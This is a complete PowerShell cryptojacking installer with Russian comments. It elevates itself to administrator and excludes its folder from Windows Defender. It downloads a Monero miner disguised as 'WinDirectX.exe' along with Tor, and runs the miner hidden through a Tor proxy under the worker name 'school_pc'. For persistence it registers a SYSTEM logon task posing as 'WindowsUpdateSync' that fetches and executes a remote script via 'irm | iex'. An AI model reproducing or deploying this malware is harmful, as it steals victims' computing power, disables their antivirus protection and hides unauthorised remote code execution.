# 0. Самовозвышение
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    $arguments = "& '" + $myinvocation.mycommand.definition + "'"
    Start-Process powershell -Verb runAs -ArgumentList $arguments
    Break
}

# --- КОНФИГУРАЦИЯ ---
$path = "C:\ProgramData\SystemLib"
$wallet = "429bPnUKuYBQQVHoap1jKTWwiPfGuKAqL7ggbTFFZdbA3LyKScc6EnP9fTVeig7jNqaF7CFhUk5eCU8S5d85gWqU6Zt6bhA" 
$procName = "WinDirectX"
# Ссылки на компоненты (обновленные)
$exeUrl = "https://github.com/Isfandiyor0112-star/sminers/raw/main/WinDirectX.exe"
$torUrl = "https://github.com/Skull6667/Tor-Binary/raw/main/tor.exe"
$rawScript = "https://raw.githubusercontent.com/Isfandiyor0112-star/sminers/main/win_utility.ps1"

Write-Host "--- ФИНАЛЬНАЯ НАСТРОЙКА СИСТЕМЫ ---" -ForegroundColor Cyan

# 1. Питание (Без сна, гаснет экран через 5 мин)
powercfg /setactive 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c -ErrorAction SilentlyContinue
powercfg /x -standby-timeout-ac 0
powercfg /x -monitor-timeout-ac 5

# 2. Чистка и папки
Stop-Process -Name $procName, "tor" -Force -ErrorAction SilentlyContinue
if (!(Test-Path $path)) { New-Item -ItemType Directory -Path $path -Force | Out-Null }
Add-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue

# 3. ЗАГРУЗКА (с маскировкой под Chrome)
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$web = New-Object System.Net.WebClient
$web.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")

try {
    if (!(Test-Path "$path\$procName.exe")) {
        $web.DownloadFile($exeUrl, "$path\$procName.exe")
        Write-Host "[OK] Майнер загружен" -ForegroundColor Green
    }
    if (!(Test-Path "$path\tor.exe")) {
        $web.DownloadFile($torUrl, "$path\tor.exe")
        Write-Host "[OK] Туннель загружен" -ForegroundColor Green
    }
} catch {
    Write-Host "[!] Сеть рубит загрузку. Пробую через BITS..." -ForegroundColor Yellow
    Start-BitsTransfer -Source $exeUrl -Destination "$path\$procName.exe" -Priority High -ErrorAction SilentlyContinue
    Start-BitsTransfer -Source $torUrl -Destination "$path\tor.exe" -Priority High -ErrorAction SilentlyContinue
}

# 4. Файлы запуска
$cmd = "@echo off`nstart /b $path\tor.exe --SocksPort 9050 --Quiet`ntimeout /t 20 /nobreak >nul`n$path\$procName.exe --title $procName --cpu-priority 1 --cpu-no-yield --cpu-max-threads-hint 50 -o gulf.moneroocean.stream:443 -u $wallet -p school_pc --algo rx/0 --donate-level 1 --tls --proxy=socks5://127.0.0.1:9050"
$cmd | Out-File -FilePath "$path\run_cache.bat" -Encoding ascii
$vbs = "Set WshShell = CreateObject(`"WScript.Shell`")`nWshShell.Run `"$path\run_cache.bat`", 0, False"
$vbs | Out-File -FilePath "$path\win_start.vbs" -Encoding ascii

# 5. ИСПРАВЛЕНИЕ КОМАНДЫ CHECK (Создаем профиль БЕЗ пробелов)
$profilePath = "$HOME\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1"
$profileDir = Split-Path $profilePath
if (!(Test-Path $profileDir)) { New-Item -Type Directory -Path $profileDir -Force | Out-Null }

$Functions = @"
function check {
    `$p = Get-Process "$procName" -ErrorAction SilentlyContinue
    `$t = Get-Process "tor" -ErrorAction SilentlyContinue
    if (`$p) { Write-Host "МАЙНЕР: РАБОТАЕТ (`$([Math]::Round(`$p.WorkingSet64 / 1MB, 2)) MB)" -ForegroundColor Green }
    else { Write-Host "МАЙНЕР: ОСТАНОВЛЕН" -ForegroundColor Red }
    if (`$t) { Write-Host "TOR-ТУННЕЛЬ: АКТИВЕН" -ForegroundColor Green }
}
function delete {
    Stop-Process -Name "$procName", "tor" -Force -ErrorAction SilentlyContinue
    Remove-Item -Path "$path" -Recurse -Force -ErrorAction SilentlyContinue
    Unregister-ScheduledTask -TaskName "WindowsUpdateSync" -Confirm:`$false -ErrorAction SilentlyContinue
    Write-Host "СИСТЕМА УДАЛЕНА" -ForegroundColor Yellow
}
"@
$Functions | Out-File -FilePath $profilePath -Force -Encoding utf8

# 6. Автозагрузка
$taskName = "WindowsUpdateSync"
$action = New-ScheduledTaskAction -Execute 'PowerShell.exe' -Argument "-WindowStyle Hidden -Command ""[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; irm '$rawScript' | iex"""
Register-ScheduledTask -Action $action -Trigger (New-ScheduledTaskTrigger -AtLogOn) -TaskName $taskName -User "System" -RunLevel Highest -Force | Out-Null

# 7. Старт
Start-Process -FilePath "$path\win_start.vbs"
Write-Host "`n--- ВСЁ ГОТОВО! ---" -ForegroundColor Magenta
Write-Host "1. Перезапусти это окно PowerShell (Админ)." -ForegroundColor Yellow
Write-Host "2. Подожди 30 сек и пиши check." -ForegroundColor Yellow
